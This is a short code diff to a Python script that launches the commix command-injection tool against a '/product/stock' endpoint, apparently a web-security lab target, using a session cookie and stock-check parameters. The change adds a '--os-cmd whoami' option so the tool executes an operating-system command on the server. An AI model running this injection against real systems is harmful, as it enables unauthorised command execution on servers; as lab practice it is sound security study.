@@ -13,10 +13,11 @@ full_url = f"{url if url[-1] != '/' else url[:-1]}/product/stock"
 
 command = [
     "python3", "commix.py",
-    "-u", full_url,
+    "--url", full_url,
     "--cookie", f'session="{session_id}"',
     "-d", "productId=1&storeId=1",
-    "--batch"
+    "--batch",
+    "--os-cmd", "whoami"
 ]
 
 print("Executing command: ", " ".join(command))
